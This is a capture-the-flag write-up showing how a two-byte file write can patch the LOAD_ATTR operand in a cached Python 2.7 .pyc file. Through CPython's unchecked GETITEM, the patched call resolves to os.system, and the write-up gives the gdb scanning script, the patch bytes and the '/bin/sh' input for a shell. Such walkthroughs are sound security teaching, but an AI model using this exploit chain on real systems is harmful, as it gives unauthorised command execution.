## Misc - Need_some_flags_2

We are given a Python console application exposed via xinetd. It allows us to
do four things:

* Option `0` (`writeflag`): three times only, write up to 0x30 characters into
`flag` global variable as well as into a new file with a random name.
* Option `1` (`editflag`): one time only, write 2 bytes into any file in the
application directory (excluding `.py` files) at any offset.
* Option `2` (`pushflag`): no-op, commented out.
* Option `3` (`secretflag`): reload the `nonsecret` module and pass an arbitrary
string to the `printlist` function inside it.

`nonsecret.py` is trivial:

```
import os
def printlist(path):
  print os.listdir(path)
```

Which files can we edit with `editflag`? `.py` ones are locked down, random flag
files are useless, and we cannot reference files outside of the current
directory. Initial import of the `nonsecret` module results in generation of
`nonsecret.pyc`, and `secretflag` reloads it - so we can edit `nonsecret.pyc`.
`.pyc` files with a fresher timestamp take precedence over older `.py` files - a
source of constant frustration in daily life.

Let's disassemble the `nonsecret.pyc` with [python-xdis](
https://github.com/rocky/python-xdis):

```
$ pydisasm --show-bytes nonsecret.pyc
```
```
# Method Name:       <module>
```
```
# Constants:
#    0: -1
#    1: None
#    2: <xdis.code.Code2 object at 0x7fc9e252deb8>
# Names:
#    0: os
#    1: printlist
  1:           0 |64 00 00| LOAD_CONST           (-1)
               3 |64 00 01| LOAD_CONST           (None)
               6 |6c 00 00| IMPORT_NAME          (os)
               9 |5a 00 00| STORE_NAME           (os)

  2:          12 |64 00 02| LOAD_CONST           (<xdis.code.Code2 object at 0x7fc9e252deb8>)
              15 |84 00 00| MAKE_FUNCTION             0
              18 |5a 00 01| STORE_NAME           (printlist)
              21 |64 00 01| LOAD_CONST           (None)
              24 |53      | RETURN_VALUE
```
```
# Method Name:       printlist
```
```
# Constants:
#    0: None
# Names:
#    0: os
#    1: listdir
# Varnames:
#	path
# Positional arguments:
#	path
  3:           0 |74 00 00| LOAD_GLOBAL          (os)
               3 |6a 00 01| LOAD_ATTR            (listdir)
               6 |7c 00 00| LOAD_FAST            (path)
               9 |83 00 01| CALL_FUNCTION        (1 positional, 0 named)
              12 |47      | PRINT_ITEM
              13 |48      | PRINT_NEWLINE
              14 |64 00 00| LOAD_CONST           (None)
              17 |53      | RETURN_VALUE
```

First guess - replace two-letter `os` module name with something else, e.g.
`uu`. Unfortunately, there is no such module with a useful `listdir` function.
Similarly, there doesn't seem to be a way to replace two consecutive letters in
`listdir` function name to get a name of a useful function.

Second guess - patch the argument of `LOAD_ATTR` so that it ends up pointing to
`system` instead of `listdir`. Inspecting [python2.7.15](
https://github.com/python/cpython/tree/v2.7.15) code shows that [`LOAD_ATTR`](
https://github.com/python/cpython/blob/v2.7.15/Python/ceval.c#L2551) does
[`GETITEM`](https://github.com/python/cpython/blob/v2.7.15/Python/ceval.c#L833),
which does no bounds checking in release builds. The `LOAD_ATTR` argument is
[unsigned](https://github.com/python/cpython/blob/v2.7.15/Python/ceval.c#L883).
So if we manage to find a `PyObject *` pointing to `system` string within
`0x10000 * 8` bytes from [`names` tuple](
https://github.com/python/cpython/blob/v2.7.15/Python/ceval.c#L1021), then we
are good.

We could increase the chances of it appearing by passing `system` to
`writeflag` (option `0`), since the value will be saved into a global variable
`flag`, which will not be overwritten or garbage collected.

How to find the offset? Let's use gdb and catch the moment when the code calls
`LOAD_ATTR` inside `printlist`. First, let's add a few things to the
`Dockerfile` to enable debugging (it's important to have the same environment
as the actual server):

```
RUN sed -i -e 's/^# deb-src /deb-src /g' /etc/apt/sources.list
RUN apt-get update
RUN apt-get install dpkg-dev gdb python2.7-dbg -y
RUN cd /usr/src && apt-get source python2.7
```

Then rebuild the image and run it with `--privileged` flag to enable debugging
(this is actually an overkill - something like `--cap-add=SYS_PTRACE
--security-opt=apparmor:unconfined` might suffice, but it's so much longer):

```
$ docker build -t need_some_flags_2 .
$ docker run -it --rm -p 4869:4869 --privileged --name need_some_flags_2 need_some_flags_2
$ docker exec -it need_some_flags_2 bash
# cd /usr/src/python2.7-2.7.15/Python
# gdb -p $(pidof python2.7)
```

We can catch execution of any code in `nonsecret` module using the following
conditional breakpoint:

```
(gdb) b PyEval_EvalFrameEx if (strcmp(PyDict_GetItemString(f->f_globals, "__name__")->ob_type->tp_name, "str") == 0) && (strcmp(PyString_AsString(PyDict_GetItemString(f->f_globals, "__name__"), 0), "nonsecret") == 0)
```

Here we abuse invoking functions in the gdb inferior. We take a frame object and
ask for a `__name__` item of its globals dict. Sometimes it may be `None`, so we
first check if it's a `str`, if yes, then we compare its value with `nonsecret`.
This breakpoint fires only two times - for module initialization and for
`printlist`. So we can skip it the first time, and then single-step to
`LOAD_ATTR` case in the switch statement in the interpreter loop.

Unfortunately, debuginfo is not good enough and does not show the location of
`names`, so after reaching `TARGET(LOAD_ATTR)` we need to issue a few `si`
commands to position ourselves at `+1602`.

```
2551	        TARGET(LOAD_ATTR)
   0x000056508de6136d <+1565>:	lea    0x2(%r9),%rbp
   0x000056508de61371 <+1569>:	movzbl -0x1(%rbp),%eax
   0x000056508de61375 <+1573>:	movzbl -0x2(%rbp),%r14d
   0x000056508de61383 <+1587>:	mov    %r9,(%rsp)
   0x000056508de61387 <+1591>:	shl    $0x8,%eax
   0x000056508de6138d <+1597>:	add    %r14d,%eax

2552	        {
2553	            w = GETITEM(names, oparg);
   0x000056508de6137a <+1578>:	mov    0x30(%rsp),%r12
   0x000056508de61390 <+1600>:	cltq
   0x000056508de61392 <+1602>:	mov    0x18(%r12,%rax,8),%r14
```

At this point, `%rax` is index (`1` in non-patched version) and `%r12` is
`names`, `0x18` is python object header size, so `%r12 + 0x18` is the start of
the array. Let's scan the memory and find the indices:

```
(gdb) python
import struct
i = gdb.inferiors()[0]
names_arr = <<<output of p/x $r12 + 0x18>>>
PyString_Type = <<<output of p/x PyString_Type>>>
for pp in range(names_arr, names_arr + 0x10000 * 8, 8):
    p, = struct.unpack('<Q', i.read_memory(pp, 8))
    try:
        r, t, l = struct.unpack('<QQQ', i.read_memory(p, 24))
    except gdb.MemoryError:
        continue
    if t == PyString_Type:
        foo = gdb.execute('p (char*)PyString_AsString((PyObject*)' + hex(p) + ')', to_string=True).strip()
        if '"system"' in foo:
            print(hex(pp))
end
```

First we scan through all pointers in the reachable area. For each pointer, if
the second quadword it points to is address of `PyString_Type`, we assume this
is a Python string. Then we use gdb to ask the Python interpreter to give us its
value, and if it's `system`, then we print the address of the corresponding
pointer. The last manual step is to subtract `%r12 + 0x18` from each printed
address (there are normally only 2 of them) and divide by 8 to get indices.
Those two indices are stable across multiple runs.

So, the final sequence is:

* Option `0` (`writeflag`): `system`
* Option `1` (`editflag`): `nonsecret.pyc`, `A8ED` | `B013`, `92`
* Option `3` (`secretflag`): `/bin/sh`

and this gives us the shell to poke around and get the flag!
